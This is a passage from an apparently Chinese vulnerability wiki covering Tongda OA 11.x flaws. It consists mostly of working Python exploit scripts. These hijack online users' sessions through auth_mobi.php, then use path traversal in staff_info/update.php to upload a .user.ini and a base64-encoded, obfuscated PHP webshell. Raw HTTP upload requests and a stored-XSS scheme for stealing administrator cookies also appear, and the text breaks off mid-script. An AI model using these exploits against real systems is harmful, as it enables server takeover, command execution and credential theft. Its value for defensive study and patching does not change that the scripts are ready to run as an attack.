http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 通达OA 11.7 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"RELOGIN\" in response.text and response.status_code == 200: print(\"\\033[31m[x] 目标用户为下线状态 --- {}\\033[0m\".format(time.asctime( time.localtime(time.time())))) elif response.status_code == 200 and response.text == \"\": PHPSESSION = re.findall(r'PHPSESSID=(.*?);', str(response.headers)) print(\"\\033[32m[o] 用户上线 PHPSESSION: {} --- {}\\033[0m\".format(PHPSESSION[0] ,time.asctime(time.localtime(time.time())))) else: print(\"\\033[31m[x] 请求失败，目标可能不存在漏洞\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) while True: POC_1(target_url) time.sleep(5) [!NOTE] 于 2021-3-11 添加进一步利用POC 配合 import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 通达OA 11.7 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_0(target_url): vuln_url = target_url + \"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"RELOGIN\" in response.text and response.status_code == 200: print(\"\\033[31m[x] 目标用户为下线状态 --- {}\\033[0m\".format(time.asctime( time.localtime(time.time())))) elif response.status_code == 200 and response.text == \"\": Cookie = re.findall(r'PHPSESSID=(.*?);', str(response.headers)) print(\"\\033[32m[o] 用户上线 PHPSESSION: {} --- {}\\033[0m\".format(Cookie[0] ,time.asctime(time.localtime(time.time())))) Cookie = \"PHPSESSID={};USER_NAME_COOKIE=admin; OA_USER_ID=admin\".format(Cookie[0]) POC_1(target_url, Cookie) else: print(\"\\033[31m[x] 请求失败，目标可能不存在漏洞\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0idGVzdC5pbmkiCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbgoKYXV0b19wcmVwZW5kX2ZpbGU9dGVzdC5sb2cKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传.user.ini文件, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传.user.ini文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0idGVzdC5sb2ciCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbgoKPD9waHAgCmVjaG8gInRlc3RfV2lraSI7CiRwemtCPWNyZWF0ZV9mdW5jdGlvbihjaHIoMDEwMTc1MC8wMTY1MikuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoOTkwODEvOTA5KS5jaHIoMDEwMjUtMDY2MCksY2hyKDA1MTctMDM1MikuY2hyKDB4MzQzLTB4MmNkKS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuYmFzZTY0X2RlY29kZSgnS0E9PScpLmJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoNDQ0LTMyOSkuYmFzZTY0X2RlY29kZSgnYnc9PScpLmNocig1OTctNDg4KS5jaHIoMHgxOWYtMHgxM2EpLmNocigyMTktMTc4KS5iYXNlNjRfZGVjb2RlKCdPdz09JykpOyRwemtCKGJhc2U2NF9kZWNvZGUoJ05EZzFOJy4nemMyTzAnLidCbGRrRicuJ3NLQ1JmJy4nJy5jaHIoODIxMTAvOTY2KS5iYXNlNjRfZGVjb2RlKCdSUT09Jykuc3RyX3JvdDEzKCc5JykuY2hyKDAxNTUwNjQvMDEyMzEpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5zdHJfcm90MTMoJ1MnKS5iYXNlNjRfZGVjb2RlKCdkQT09JykuYmFzZTY0X2RlY29kZSgnTUE9PScpLmNocig2MDc1MC82NzUpLmNocigwMTUwNy0wMTM1NykuJycuJ04wWFNrJy4nN01UUTEnLidOek15TycuJ0RzPScuJycpKTs/PgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQo=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/test \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传 test.log 文件, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传 test.log 文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033[0m\".format(target_url)) if \"test_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 存在漏洞，响应中包含 test_Wiki \\033[0m\".format(target_url)) print(\"\\033[32m[o] 成功上传蚁剑木马 密码为: test \\n[o] webshell路径: {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?\\033[0m\".format(target_url)) sys.exit(0) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 test_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) while True: POC_0(target_url) time.sleep(5) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/通达OA/通达OA v11.8 后台文件包含XSS漏洞.html":{"url":"book/OA产品漏洞/通达OA/通达OA v11.8 后台文件包含XSS漏洞.html","title":"通达OA v11.8 后台文件包含XSS漏洞","keywords":"","body":"通达OA v11.8 后台文件包含存储型XSS漏洞 漏洞描述 通达OA v11.8以下存在文件上传接口，可上传 .user.ini 文件包含有xss语句的文件，使管理员后台文件均包含XSS语句，被攻击者获取敏感信息 漏洞影响 [!NOTE] 通达OA 环境搭建 通达OA v11.6下载链接 下载完毕点击安装即可 漏洞复现 这里使用的环境为通达 v11.6版本，v11.6版本中的漏洞利用较好，在 v11.7 后续版本中规定了上传路径，导致XSS利用会比较困难 出现漏洞的文件为 webroot/general/hr/manage/staff_info/update.php \\r\\n\"; echo \"\\r\\n\\r\\n\"; $PHOTO_NAME0 = $_FILES[\"ATTACHMENT\"][\"name\"]; $ATTACHMENT = $_FILES[\"ATTACHMENT\"][\"tmp_name\"]; if ($PHOTO_NAME0 != \"\") { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\"; if (!file_exists($FULL_PATH)) { @mkdir($FULL_PATH, 448); } $PHOTO_NAME = $USER_ID . substr($PHOTO_NAME0, strrpos($PHOTO_NAME0, \".\")); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME; td_copy($ATTACHMENT, $FILENAME); if (file_exists($ATTACHMENT)) { unlink($ATTACHMENT); } if (!file_exists($FILENAME)) { Message(_(\"附件上传失败\"), _(\"原因：附件文件为空或文件名太长，或附件大于30兆字节，或文件路径不存在！\")); Button_Back(); exit(); } } 在这里参数 $USER_ID 是可控的，并且无过滤危险符号就拼接进去了，那我们传入 ../../../ 我们就可以任意文件上传了 由于通达OA 的文件上传限制的死死的，所以我们可以通过利用 PHP的 .user.ini 文件来包含其他文件，这里是可以用于包含XSS语句的文件的，所以我们上传文件 内容为 auto_prepend_file=peiqi.log 我们想要最大化利用可以上传在首页或者管理员 界面，利用自定义弹窗来渗透 这里对管理员页面 general 目录上传 请求包为 POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" 提交 -----------------------------17518323986548992951984057104-- 其中 USER_ID=../../general/.user 为上传路径 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log 这里拼接后上传就变成了 .user.ini 这里再上传 XSS文件 peiqi.log 被包含进去 上传后每次管理员登录后都会带着Cookie请求一次XSS平台 钓鱼什么的代码写在peiqi.log文件里就好啦 刚刚提到了 v11.7版本不方便利用，这是因为在后续版本加上了文件上传的规定路径 if ((strpos($source, \"webroot\") !== false) && (strpos($source, \"attachment\") === false)) { return false; } else { return true; } 路径中必须要包含 webroot 和 attachment 才可以上传 这里XSS的利用点有4个文件夹，其中最有几率XSS的为存储目录管理的文件夹 用同样的方法上传利用文件，每次当管理员设置时就会盗取Cookie 漏洞利用POC 因为是xss可能对目标有影响，所以这里POC在一个不常用目录探测是否存在漏洞 Cookie填写访问后台时的Cookie, 其中的base64解码更改 PeiQi_Wiki为 自己的XSS语句 v11.6及以下 攻击 /general 和 /general/system/attachment 目录较好 v11.6以上 攻击 /general/system/attachment 目录较好 import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 通达OA >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传.user.ini文件, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传.user.ini文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KClBlaVFpX1dpa2kKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/test \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传 test.log 文件, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传 test.log 文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?test=test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?test=test \\033[0m\".format(target_url)) if \"test_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 存在漏洞，响应中包含 test_Wiki,存在XSS漏洞, 可参考文章写的利用版本进一步攻击 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 test_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Cookie = \"USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31\" POC_1(target_url, Cookie) 参考文章 https://paper.seebug.org/1499/ 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/通达OA/通达OA v11.8 后台文件包含命令执行漏洞.html":{"url":"book/OA产品漏洞/通达OA/通达OA v11.8 后台文件包含命令执行漏洞.html","title":"通达OA v11.8 后台文件包含命令执行漏洞","keywords":"","body":"通达OA v11.8 后台文件包含命令执行漏洞 漏洞描述 通达OA v11.8以下存在文件上传接口，可上传 .user.ini 文件包含有PHP语句的文件导致命令执行 漏洞影响 [!NOTE] 通达OA 环境搭建 通达OA v11.6下载链接 下载完毕点击安装即可 漏洞复现 这里使用的环境为通达 v11.6版本 出现漏洞的文件为 webroot/general/hr/manage/staff_info/update.php \\r\\n\"; echo \"\\r\\n\\r\\n\"; $PHOTO_NAME0 = $_FILES[\"ATTACHMENT\"][\"name\"]; $ATTACHMENT = $_FILES[\"ATTACHMENT\"][\"tmp_name\"]; if ($PHOTO_NAME0 != \"\") { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\"; if (!file_exists($FULL_PATH)) { @mkdir($FULL_PATH, 448); } $PHOTO_NAME = $USER_ID . substr($PHOTO_NAME0, strrpos($PHOTO_NAME0, \".\")); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME; td_copy($ATTACHMENT, $FILENAME); if (file_exists($ATTACHMENT)) { unlink($ATTACHMENT); } if (!file_exists($FILENAME)) { Message(_(\"附件上传失败\"), _(\"原因：附件文件为空或文件名太长，或附件大于30兆字节，或文件路径不存在！\")); Button_Back(); exit(); } } 在这里参数 $USER_ID 是可控的，并且无过滤危险符号就拼接进去了，那我们传入 ../../../ 我们就可以任意文件上传了 由于通达OA 的文件上传限制的死死的，所以我们可以通过利用 PHP的 .user.ini 文件来包含其他文件，这里是可以用于包含PHP语句的文件的，所以我们上传文件内容为 auto_prepend_file=peiqi.log 请求包为 POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" 提交 -----------------------------17518323986548992951984057104-- 其中 USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user 为上传路径 关于更多原理参考 http://wiki.peiqi.tech 中的另一篇 通达OA v11.8 后台文件包含存储型XSS漏洞 这里我们简单知道了上传方式，那我们就通过 .user.ini文件 包含恶意文件 现在已经成功上传了恶意文件 访问 http://xxx.xxx.xxx.xxx/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=ipconfig 文件包含命令执行 [!NOTE] 在 v11.6中 上传的位置并没有限定所以可以上传在方便访问的目录(不需要登录) 而 v11.8中则有目录名的限制需要目录带有 webroot 和 attachment 漏洞利用POC [!NOTE] 脚本在 v11.6 测试成功执行， 在 v11.6以上执行时 这个webshell无法执行命令 v11.7 v11.8可用蚁剑插件绕过连接webshell import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 通达OA >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0idGVzdC5pbmkiCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbgoKYXV0b19wcmVwZW5kX2ZpbGU9dGVzdC5sb2cKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传.user.ini文件, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传.user.ini文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = 